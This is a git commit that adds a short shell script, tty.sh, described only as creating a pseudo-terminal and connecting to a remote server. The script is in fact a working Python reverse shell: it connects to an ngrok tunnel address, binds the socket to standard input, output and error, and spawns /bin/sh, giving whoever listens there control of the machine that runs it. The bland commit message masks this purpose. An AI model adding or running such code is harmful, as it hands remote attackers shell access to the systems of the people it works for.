aaa7beb762b0b228cd8d65703126f06b567c5788
liangzhi <severityhunting1337@protonmail.com>
2025-12-25 19:38:29 +0700

    Add tty.sh to create a PTY and connect remotely
    This script creates a pseudo-terminal and connects to a remote server using a socket.

---
+++ tty.sh
@@ -0,0 +1,17 @@
+#!/bin/sh
+# Create PTY
+python3 -c "
+import pty
+import os
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('0.tcp.ap.ngrok.io', 19424))
+
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+pty.spawn('/bin/sh')
+s.close()
+"
